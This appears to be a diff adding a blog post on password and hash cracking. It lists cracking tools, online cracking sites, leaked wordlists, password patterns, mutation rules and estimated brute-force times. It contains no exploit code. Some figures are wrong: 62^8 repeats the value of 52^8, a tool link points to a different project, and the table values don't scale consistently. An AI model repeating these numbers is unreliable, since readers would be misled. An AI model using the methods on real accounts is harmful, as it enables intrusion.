+Since then, further advancements in computing power and cryptanalysis techniques have made collision attacks against MD5 even more feasible and practical. Today, it is relatively easy to generate MD5 collisions using specialized hardware or distributed computing resources. &lt;br /&gt;
+Due to these vulnerabilities, MD5 is no longer considered secure for cryptographic purposes, and its use has been strongly discouraged in favor of more secure hashing algorithms such as SHA-256 or SHA-3. In fact, most modern security standards and protocols explicitly prohibit the use of MD5 due to its susceptibility to collision attacks.&lt;/p&gt;
+&lt;h2 id=&#34;tools-for-hash-cracking&#34;&gt;Tools for Hash Cracking
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/tools.jpg&#34;
+	width=&#34;738&#34;
+	height=&#34;576&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/tools_hu12748403592501029798.jpg 480w, http://localhost:1313/p/password-cracking/assets/images/tools_hu8750775526461045458.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Tools&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;128&#34;
+		data-flex-basis=&#34;307px&#34;
+	
+&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://hashcat.net/hashcat/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Hashcat&lt;/a&gt;: A highly versatile and powerful password recovery tool that supports various hashing algorithms and attack modes, including brute force, dictionary, and mask attacks&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/openwall/john&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;John the Ripper&lt;/a&gt;: One of the oldest and most widely used password cracking tools, capable of performing dictionary and brute force attacks against various password hashes.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://ophcrack.sourceforge.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Ophcrack&lt;/a&gt;: A free and open-source tool primarily used for cracking Windows passwords by leveraging rainbow tables for LM and NTLM hashes.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/tools/medusa/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Medusa&lt;/a&gt;: A parallel login brute-forcer that supports various protocols, including SSH, FTP, Telnet, HTTP(S), SMB, and others.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/tools/hydra/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Hydra&lt;/a&gt;: A network login cracker that supports various protocols like SSH, FTP, Telnet, HTTP(S), and others, making it useful for cracking passwords on network services.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://sectools.org/tool/cain/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Cain and Abel&lt;/a&gt;: A versatile password recovery tool that can recover passwords using various methods such as dictionary attacks, brute-force attacks, and cryptanalysis attacks.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://project-rainbowcrack.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RainbowCrack&lt;/a&gt;: A password cracking tool that uses rainbow tables to crack hashes. It can handle various hash algorithms and supports distributed cracking.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.aircrack-ng.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Aircrack-ng&lt;/a&gt;: A popular tool for cracking Wi-Fi passwords by capturing and analyzing network packets, supporting various encryption algorithms like WEP and WPA/WPA2.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://hashcat.net/forum/thread-9151.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;HashcatGUI&lt;/a&gt;: A graphical user interface for Hashcat, providing an easier and more user-friendly way to perform hash cracking tasks.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Azure/PyRIT&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Pyrit&lt;/a&gt;: Another tool for cracking Wi-Fi passwords, Pyrit specializes in attacking WPA/WPA2-PSK authentication.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/tools/fcrackzip/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;fcrackzip&lt;/a&gt;: fcrackzip is a fast password cracker partly written in assembler. It is able to crack password protected zip files with brute force or dictionary based attacks, optionally testing with unzip its results. It can also crack cpmask’ed images.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;websites-for-hash-cracking&#34;&gt;Websites for Hash Cracking
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.onlinehashcrack.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;OnlineHashCrack&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Crack Station&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://hashes.com/en/decrypt/hash&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Hashes.com&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://md5hashing.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;MD5 Hashing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://nitrxgen.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Ntirxgen&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;wordlists&#34;&gt;Wordlists
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/wordlists.png&#34;
+	width=&#34;1747&#34;
+	height=&#34;478&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/wordlists_hu3032474284580762306.png 480w, http://localhost:1313/p/password-cracking/assets/images/wordlists_hu4384129554991596746.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Wordlists&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;365&#34;
+		data-flex-basis=&#34;877px&#34;
+	
+&gt;&lt;br /&gt;
+Most of the time Wordlists that contain commonly used passwords and words are used for this puspose. Wordlists like this typically originate from data breaches, leaks, or public disclosures of passwords used by individuals on various online platforms. Several famous wordlists are widely used in password cracking, security testing, and research. Here are some of the most notable ones:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;RockYou: One of the largest and most well-known wordlists, containing millions of commonly used passwords leaked from the RockYou data breach in 2009.&lt;/li&gt;
+&lt;li&gt;SecLists: A collection of multiple wordlists curated and maintained by Daniel Miessler and Jason Haddix, covering various categories such as passwords, usernames, web shells, and more.&lt;/li&gt;
+&lt;li&gt;Probable Wordlists: Wordlists generated by combining common words, names, dates, and patterns likely to be used in passwords, often used in conjunction with brute force and dictionary attacks.&lt;/li&gt;
+&lt;li&gt;CrackStation: A collection of wordlists generated from leaked password databases, providing a comprehensive dataset for password cracking purposes.&lt;/li&gt;
+&lt;li&gt;Hashes.org: An online repository of hashed passwords and associated wordlists, allowing researchers and security professionals to collaborate on password cracking projects.&lt;/li&gt;
+&lt;li&gt;WPA/WPA2 Wordlists: Specialized wordlists containing common passwords and phrases used in Wi-Fi networks protected by WPA/WPA2 encryption, often used for cracking wireless network passwords.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- --&gt;
+&lt;p&gt;More Lists of Wordlists can be found on &lt;a class=&#34;link&#34; href=&#34;https://weakpass.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;WeakPass&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;custom-wordlists&#34;&gt;Custom Wordlists
+&lt;/h2&gt;&lt;p&gt;Several tools are available for generating wordlists, which are essential for password cracking and security testing. Here are some popular ones:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/jim3ma/crunch&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Crunch&lt;/a&gt;: A powerful wordlist generator that allows users to specify custom character sets, lengths, and patterns for generating wordlists.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Mebus/cupp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CUPP&lt;/a&gt; (Common User Passwords Profiler): A simple tool that generates custom wordlists based on personal information such as names, dates, and common passwords.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/digininja/CeWL&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CeWL&lt;/a&gt; (Custom Word List generator): A tool that spiders a target website to create custom wordlists based on the content found in the web pages.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;cpu-vs-gpu&#34;&gt;CPU vs GPU
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/cpu-vs-gpu.jpg&#34;
+	width=&#34;800&#34;
+	height=&#34;445&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/cpu-vs-gpu_hu4494810528079756738.jpg 480w, http://localhost:1313/p/password-cracking/assets/images/cpu-vs-gpu_hu7107262851154168624.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;CPU vs GPU&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;179&#34;
+		data-flex-basis=&#34;431px&#34;
+	
+&gt;&lt;br /&gt;
+The choice between using CPU (Central Processing Unit) and GPU (Graphics Processing Unit) for hash cracking can significantly impact the speed and efficiency of the cracking process.&lt;/p&gt;
+&lt;h3 id=&#34;cpu-hash-cracking&#34;&gt;CPU Hash Cracking
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;CPUs are general-purpose processors designed to handle a wide range of tasks, including hash cracking&lt;/li&gt;
+&lt;li&gt;While CPUs can execute a variety of instructions, they typically have a limited number of processing cores compared to GPUs&lt;/li&gt;
+&lt;li&gt;Hash cracking on CPU relies heavily on the CPU&amp;rsquo;s processing power and its ability to handle sequential tasks efficiently&lt;/li&gt;
+&lt;li&gt;CPUs are well-suited for tasks that require complex logic, branching, and sequential processing, which are often found in password cracking algorithms&lt;/li&gt;
+&lt;li&gt;However, CPU hash cracking tends to be slower compared to GPU cracking, especially when dealing with large datasets or complex hashing algorithms&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;gpu-hash-cracking&#34;&gt;GPU Hash Cracking
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;GPUs are highly parallelized processors designed to handle large amounts of data simultaneously, making them well-suited for hash cracking.&lt;/li&gt;
+&lt;li&gt;Modern GPUs contain thousands of cores optimized for parallel processing, allowing them to perform many calculations simultaneously&lt;/li&gt;
+&lt;li&gt;Hash cracking on GPU can leverage the massive parallel processing power of GPUs to accelerate the cracking process significantly&lt;/li&gt;
+&lt;li&gt;GPUs are particularly effective at tasks that involve simple, repetitive calculations, such as those commonly encountered in cryptographic algorithms used for hashing&lt;/li&gt;
+&lt;li&gt;As a result, GPU hash cracking can achieve much higher speeds compared to CPU cracking, especially for algorithms that can be easily parallelized&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;types-of-passwords&#34;&gt;Types of Passwords
+&lt;/h2&gt;&lt;p&gt;It is also possible to classify passwords into certain sets. These sets can make the password cracking process more efficient, especially if we have some information about the targetted individual or group of individuals.&lt;br /&gt;
+Here are a few sets:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dictionary Password
+&lt;ul&gt;
+&lt;li&gt;These passwords are derived from words found in dictionaries. Attackers often use dictionary-based attacks where they try common words or phrases as passwords.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;sunshine&amp;rdquo;, &amp;ldquo;password123&amp;rdquo;, &amp;ldquo;football&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Short Set
+&lt;ul&gt;
+&lt;li&gt;Short sets are passwords that consist of a small number of characters or digits. These passwords are relatively easier to guess or crack through brute force methods compared to longer, more complex passwords.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;1234&amp;rdquo;, &amp;ldquo;abcd&amp;rdquo;, &amp;ldquo;qwerty&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Keywalk
+&lt;ul&gt;
+&lt;li&gt;Keywalk passwords involve selecting characters that are adjacent to each other on a keyboard layout. Users may choose this method thinking it&amp;rsquo;s easy to remember, but it can be insecure due to its predictability.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;qwertyuiop&amp;rdquo;, &amp;ldquo;asdfghjkl&amp;rdquo;, &amp;ldquo;zxcvbnm&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Personal Data
+&lt;ul&gt;
+&lt;li&gt;These passwords incorporate personal information such as names, birthdates, addresses, or other identifiable information. While easy to remember, they are often easy to guess by someone who knows the individual well or can gather information about them.&lt;/li&gt;
+&lt;li&gt;This type of password can be easily generated with &lt;a class=&#34;link&#34; href=&#34;https://github.com/Mebus/cupp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CUPP&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;John1985NY&amp;rdquo;, &amp;ldquo;SarahSmith1234&amp;rdquo;, &amp;ldquo;London33&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Distortion of Specific Words
+&lt;ul&gt;
+&lt;li&gt;This method involves taking a common word or phrase and intentionally misspelling or distorting it in some way to create a password. While it may seem secure, attackers can still use techniques like dictionary attacks to crack them.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;P@$$w0rd&amp;rdquo; (instead of &amp;ldquo;Password&amp;rdquo;), &amp;ldquo;L0v3ly&amp;rdquo; (instead of &amp;ldquo;Lovely&amp;rdquo;), &amp;ldquo;S3cur!ty&amp;rdquo; (instead of &amp;ldquo;Security&amp;rdquo;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Repetitive Patterns
+&lt;ul&gt;
+&lt;li&gt;These passwords involve repeating a pattern of characters, numbers, or symbols. While they may seem complex at first, they can be easily cracked through pattern recognition.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;123123&amp;rdquo;, &amp;ldquo;abcabc&amp;rdquo;, &amp;ldquo;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Sequential Characters
+&lt;ul&gt;
+&lt;li&gt;Sequential character passwords involve using characters that appear in sequence in the alphabet or somewhere else. These passwords are often weak due to their predictability.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;abcdef&amp;rdquo;, &amp;ldquo;123456&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Common Phrases or Quotes
+&lt;ul&gt;
+&lt;li&gt;Passwords are derived from well-known phrases, slogans, or quotes. While they may be easy to remember, they are also easier for attackers to guess through dictionary-based attacks.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;ToBeOrNotToBe&amp;rdquo;, &amp;ldquo;LiveLaughLove&amp;rdquo;, &amp;ldquo;AllYouNeedIsLove&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Keyboard Walks (Non-linear)
+&lt;ul&gt;
+&lt;li&gt;Unlike Keywalk passwords, these passwords involve selecting characters that are not adjacent to each other on a keyboard layout but follow a non-linear path. They might involve skipping or jumping over keys.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;plmokn&amp;rdquo;, &amp;ldquo;qawsed&amp;rdquo;, &amp;ldquo;okmijn&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Leet Speak Substitution
+&lt;ul&gt;
+&lt;li&gt;Leet Speak involves replacing letters with similar-looking characters or symbols. While it can increase complexity, it&amp;rsquo;s still vulnerable to dictionary-based attacks unless combined with other techniques.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;p@ssw0rd&amp;rdquo; (for &amp;ldquo;password&amp;rdquo;), &amp;ldquo;l33t&amp;rdquo; (for &amp;ldquo;leet&amp;rdquo;), &amp;ldquo;h4ck3r&amp;rdquo; (for &amp;ldquo;hacker&amp;rdquo;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;password-distortion-rules&#34;&gt;Password Distortion Rules
+&lt;/h2&gt;&lt;p&gt;Distortion rules in password cracking refer to various strategies and techniques attackers use to modify or manipulate passwords to crack them more effectively. These rules are applied during brute-force or dictionary attacks to generate a more extensive set of potential passwords by systematically altering known patterns, words, or phrases.&lt;br /&gt;
+Here are some common distortion rules used in password cracking:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Character Substitution
+&lt;ul&gt;
+&lt;li&gt;This rule involves replacing certain characters in a password.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;password&amp;rdquo; might be distorted to &amp;ldquo;cnffjbeq&amp;rdquo; (ROT13 Algorithm).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Case Variations
+&lt;ul&gt;
+&lt;li&gt;Case variations involve changing the case of letters within a password, making some uppercase and some lowercase. This rule increases the search space for cracking algorithms.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;Password&amp;rdquo; might be distorted to &amp;ldquo;pAsswOrd&amp;rdquo;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Repetition
+&lt;ul&gt;
+&lt;li&gt;Repetition involves adding additional instances of characters or sequences within a password. This rule capitalizes on patterns humans tend to use, such as repeating characters or sequences.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;hello&amp;rdquo; might be distorted to &amp;ldquo;hellohello&amp;rdquo;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Appending or Prepending
+&lt;ul&gt;
+&lt;li&gt;Appending or prepending involves adding additional characters or sequences to the beginning or end of a password. Common choices include numbers, symbols, or words.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;password&amp;rdquo; might be distorted to &amp;ldquo;password123&amp;rdquo; or &amp;ldquo;@password&amp;rdquo;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Keyboard Patterns
+&lt;ul&gt;
+&lt;li&gt;Keyboard patterns involve manipulating passwords based on their proximity on a standard keyboard layout. This includes variations like adjacent keys, diagonal keys, or alternate rows.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;qwerty&amp;rdquo; might be distorted to &amp;ldquo;qweRty&amp;rdquo;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Common Affixes
+&lt;ul&gt;
+&lt;li&gt;This rule applies common prefixes or suffixes to passwords. Attackers might add common words or numbers before or after existing passwords to attempt cracking.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;password&amp;rdquo; might be distorted to &amp;ldquo;password123&amp;rdquo; or &amp;ldquo;mypassword&amp;rdquo;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;L33t Speak
+&lt;ul&gt;
+&lt;li&gt;This type of Character Substitution replaces letters with visually similar numbers or symbols; in Character Substitution, the characters don&amp;rsquo;t have to be identical in any form. This rule capitalizes on common substitutions used by users to make their passwords more complex. For example, &amp;rsquo;e&amp;rsquo; might be replaced with &amp;lsquo;3&amp;rsquo;, &amp;lsquo;a&amp;rsquo; might be replaced with &amp;lsquo;@&amp;rsquo;, and &amp;lsquo;o&amp;rsquo; might be replaced with &amp;lsquo;0&amp;rsquo;.&lt;/li&gt;
+&lt;li&gt;Example: &amp;ldquo;Password&amp;rdquo; might be distorted to &amp;ldquo;P@$$w0rd&amp;rdquo;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;password-strength&#34;&gt;Password Strength
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/password-strength.jpg&#34;
+	width=&#34;2200&#34;
+	height=&#34;750&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/password-strength_hu14296305625101620386.jpg 480w, http://localhost:1313/p/password-cracking/assets/images/password-strength_hu5624597227159595850.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Password Strength&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;293&#34;
+		data-flex-basis=&#34;704px&#34;
+	
+&gt;&lt;br /&gt;
+It is not always possible to crack a Hash and Obtain a password (in our lifetime). &lt;br /&gt;
+Let us take an example, suppose we have the following information:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hash&lt;/li&gt;
+&lt;li&gt;Hashing Algorithm&lt;/li&gt;
+&lt;li&gt;Length of the Password&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- --&gt;
+&lt;p&gt;For the sake of example, let us assume:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Rate of calculating the hashes = 100 Million Hashes / second&lt;/li&gt;
+&lt;li&gt;Length of the Password = 8&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- --&gt;
+&lt;h3 id=&#34;character-set-0---numbers&#34;&gt;Character Set 0 - Numbers
+&lt;/h3&gt;&lt;p&gt;Characters Available = 10&lt;br /&gt;
+Number of Possible Passwords = 10^8 = 100000000 Passwords&lt;br /&gt;
+Time Taken to Crack the Password = &lt;strong&gt;1 second&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;character-set-i---lowercase-ascii-characters&#34;&gt;Character Set I - Lowercase ASCII Characters
+&lt;/h3&gt;&lt;p&gt;Characters Available = 26&lt;br /&gt;
+Number of Possible Passwords = 26^8 = 208827064576 Passwords&lt;br /&gt;
+Time Taken to Crack the Password = &lt;strong&gt;2088.27 seconds = 34.8 minutes&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;character-set-ii---lowercase-ascii-characters--numbers&#34;&gt;Character Set II - Lowercase ASCII Characters + Numbers
+&lt;/h3&gt;&lt;p&gt;Characters Available = 36&lt;br /&gt;
+Number of Possible Passwords = 36^8 = 2.821109907×10¹² Passwords&lt;br /&gt;
+Time Taken to Crack the Password = &lt;strong&gt;28211.09 seconds = 470.18 minutes = 7.83 hours&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;character-set-iii---lowercase-ascii-characters--uppercase-ascii-characters&#34;&gt;Character Set III - Lowercase ASCII Characters + Uppercase ASCII Characters
+&lt;/h3&gt;&lt;p&gt;Characters Available = 52&lt;br /&gt;
+Number of Possible Passwords = 52^8 = 5.345972853×10¹³ Passwords&lt;br /&gt;
+Time Taken to Crack the Password = &lt;strong&gt;534597.28 seconds = 8909.95 minutes = 148.49 hours = 6.18 Days&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;character-set-iv---lowercase-ascii-characters--uppercase-ascii-characters--numbers&#34;&gt;Character Set IV - Lowercase ASCII Characters + Uppercase ASCII Characters + Numbers
+&lt;/h3&gt;&lt;p&gt;Characters Available = 62&lt;br /&gt;
+Number of Possible Passwords = 62^8 = 5.345972853×10¹³ Passwords&lt;br /&gt;
+Time Taken to Crack the Password = &lt;strong&gt;2183401.05 seconds = 36390.01 minutes = 606.5 hours = 25.27 Days&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;character-set-v---lowercase-ascii-characters--uppercase-ascii-characters--numbers--special-characters&#34;&gt;Character Set V - Lowercase ASCII Characters + Uppercase ASCII Characters + Numbers + Special Characters
+&lt;/h3&gt;&lt;p&gt;Characters Available = 128&lt;br /&gt;
+Number of Possible Passwords = 128^8 = 7.205759404×10¹⁶ Passwords&lt;br /&gt;
+Time Taken to Crack the Password = &lt;strong&gt;720575940.37 seconds = 12009599.00 minutes = 200159.98 hours = 8339.99 Days = 22.84 Years&lt;/strong&gt;&lt;br /&gt;&lt;br /&gt;
+So, here we saw that the time to crack the password increases significantly when we use more characters, making our password more complex.&lt;br /&gt;
+Here, in this case, we knew how long the password was. But in most real-life scenarios, when Hash Cracking is involved, we don&amp;rsquo;t know anything about the length of the password, making it even more time-consuming to do a Brutforce attack.&lt;br /&gt;
+That&amp;rsquo;s why you should keep a complex password that uses all of the following Characters:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Lowercase ASCII Characters&lt;/li&gt;
+&lt;li&gt;Uppercase ASCII Characters&lt;/li&gt;
+&lt;li&gt;Numbers&lt;/li&gt;
+&lt;li&gt;Special Characters&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- --&gt;
+&lt;p&gt;Below is the table that shows how much time it would take to crack a hash with certain conditions&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Length&lt;/th&gt;
+&lt;th&gt;Numbers&lt;/th&gt;
+&lt;th&gt;Lowercase ASCII Characters&lt;/th&gt;
+&lt;th&gt;Lowercase ASCII Characters + Numbers&lt;/th&gt;
+&lt;th&gt;Lowercase ASCII Characters + Uppercase ASCII Characters&lt;/th&gt;
+&lt;th&gt;Lowercase ASCII Characters + Uppercase ASCII Characters + Numbers&lt;/th&gt;
+&lt;th&gt;Lowercase ASCII Characters + Uppercase ASCII Characters + Numbers + Special Characters&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;8&lt;/td&gt;
+&lt;td&gt;1 sec&lt;/td&gt;
+&lt;td&gt;34.8 min&lt;/td&gt;
+&lt;td&gt;7.83 hours&lt;/td&gt;
+&lt;td&gt;6.18 days&lt;/td&gt;
+&lt;td&gt;25.27 days&lt;/td&gt;
+&lt;td&gt;22.84 years&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;9&lt;/td&gt;
+&lt;td&gt;10 sec&lt;/td&gt;
+&lt;td&gt;15.08 hours&lt;/td&gt;
+&lt;td&gt;8.57 days&lt;/td&gt;
+&lt;td&gt;162.12 days&lt;/td&gt;
+&lt;td&gt;1.8 years&lt;/td&gt;
+&lt;td&gt;57.1 years&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;10&lt;/td&gt;
+&lt;td&gt;1.67 min&lt;/td&gt;
+&lt;td&gt;16.28 days&lt;/td&gt;
+&lt;td&gt;223.03 days&lt;/td&gt;
+&lt;td&gt;11.51 years&lt;/td&gt;
+&lt;td&gt;47.46 years&lt;/td&gt;
+&lt;td&gt;1497.55 years&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;11&lt;/td&gt;
+&lt;td&gt;16.67 min&lt;/td&gt;
+&lt;td&gt;281.93 days&lt;/td&gt;
+&lt;td&gt;10.56 years&lt;/td&gt;
+&lt;td&gt;199.92 years&lt;/td&gt;
+&lt;td&gt;820.928 years&lt;/td&gt;
+&lt;td&gt;25843.264 years&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;12&lt;/td&gt;
+&lt;td&gt;2.78 hours&lt;/td&gt;
+&lt;td&gt;9.515 years&lt;/td&gt;
+&lt;td&gt;130.341 years&lt;/td&gt;
+&lt;td&gt;2463.897 years&lt;/td&gt;
+&lt;td&gt;1023042.47 years&lt;/td&gt;
+&lt;td&gt;6133565802.2 years&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;This table is just an example and not indicative of the actual time taken for hash cracking. A good understanding of multithreading and CUDA programming can even accelerate this by a factor.&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;success-rate-of-hash-cracking&#34;&gt;Success Rate of Hash Cracking
